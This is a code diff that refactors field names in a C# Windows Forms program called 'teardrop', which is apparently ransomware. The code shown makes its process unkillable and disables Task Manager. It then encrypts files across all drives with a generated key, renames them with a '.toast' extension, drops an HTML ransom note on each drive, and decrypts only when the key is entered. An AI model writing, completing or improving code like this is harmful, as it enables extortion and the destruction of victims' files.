@@ -2,11 +2,11 @@ namespace teardrop
 {
     public partial class FrmMain : Form
     {
-        private IProgress<string> notification;
-        private static string generatedKey = string.Empty;
-        private const string defaultExtension = ".toast";
-        private const string defaultMessage = "<h1>Title:</h1><p>Message</p>";
-        CancellationTokenSource _cancellationTokenSource;
+        private readonly IProgress<string> _notification;
+        private static string _generatedKey = string.Empty;
+        private const string _defaultExtension = ".toast";
+        private const string _defaultMessage = "<h1>Title:</h1><p>Message</p>";
+        private readonly CancellationTokenSource _cancellationTokenSource;
 
         private enum CypherMode
         {
@@ -38,26 +38,26 @@ namespace teardrop
         public FrmMain()
         {
             InitializeComponent();
-            notification = new Progress<string>(WriteLine);
+            _notification = new Progress<string>(WriteLine);
             _cancellationTokenSource = new CancellationTokenSource();
         }
 
         private void Setup()
         {
-            GenerateKeys();
+            GenerateKey();
             GenerateRandomApplicationName();
             ProcessManager.ProcessUnkillable();
             MachineManager.DisableTaskManager();
         }
 
-        private void GenerateKeys()
+        private void GenerateKey()
         {
-            generatedKey = CryptoManager.GetRandomString(64);
+            _generatedKey = CryptoManager.GetRandomString(64);
         }
 
         private void GenerateRandomApplicationName()
         {
-            Text = CryptoManager.GetRandomString(64);
+            Text = CryptoManager.GetRandomString(50);
         }
 
         public void WriteLine(string text)
@@ -72,7 +72,7 @@ namespace teardrop
                 if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                 {
                     string newFilePath = string.Empty;
-                    string defaultKey = generatedKey;
+                    string defaultKey = _generatedKey;
 
                     foreach (string directory in GetValidDirectories(rootPath))
                     {
@@ -85,7 +85,7 @@ namespace teardrop
                                 case CypherMode.Encode:
                                     if (!IsValidExtension(extension)) break;
 
-                                    newFilePath = FileManager.AddExtension(filePath, defaultExtension);
+                                    newFilePath = FileManager.AddExtension(filePath, _defaultExtension);
 
                                     await CryptoManager.EncodeFileAsync(filePath, newFilePath, defaultKey, cancellationToken);
 
@@ -95,9 +95,9 @@ namespace teardrop
                                     break;
 
                                 case CypherMode.Decode:
-                                    if (!FileManager.HasExtension(filePath, defaultExtension)) break;
+                                    if (!FileManager.HasExtension(filePath, _defaultExtension)) break;
 
-                                    newFilePath = FileManager.RemoveExtension(filePath, defaultExtension);
+                                    newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);
 
                                     await CryptoManager.DecodeFileAsync(filePath, newFilePath, defaultKey, _cancellationTokenSource.Token);
 
@@ -160,7 +160,7 @@ namespace teardrop
 
                 await ChangeAllFilesAsync(drive.Name, mode, notification, cancellationToken);
 
-                FileManager.WriteHtmlFile(drive.Name, defaultMessage);
+                FileManager.WriteHtmlFile(drive.Name, _defaultMessage);
 
             }
             catch (Exception ex)
@@ -175,7 +175,7 @@ namespace teardrop
             //await ChangeAllFilesAsync("C:/testDir", CypherMode.Encode, notification, _cancellationTokenSource.Token);
             //await ChangeAllFilesAsync("C:/testDir", CypherMode.Decode, notification, _cancellationTokenSource.Token);
 
-            await ManageDrivesAsync(CypherMode.Encode, notification, _cancellationTokenSource.Token);
+            await ManageDrivesAsync(CypherMode.Encode, _notification, _cancellationTokenSource.Token);
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
@@ -187,9 +187,9 @@ namespace teardrop
         {
             if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;
 
-            generatedKey = txtKey.Text;
+            _generatedKey = txtKey.Text;
 
-            await ManageDrivesAsync(CypherMode.Decode, notification, _cancellationTokenSource.Token);
+            await ManageDrivesAsync(CypherMode.Decode, _notification, _cancellationTokenSource.Token);
         }
     }
 }
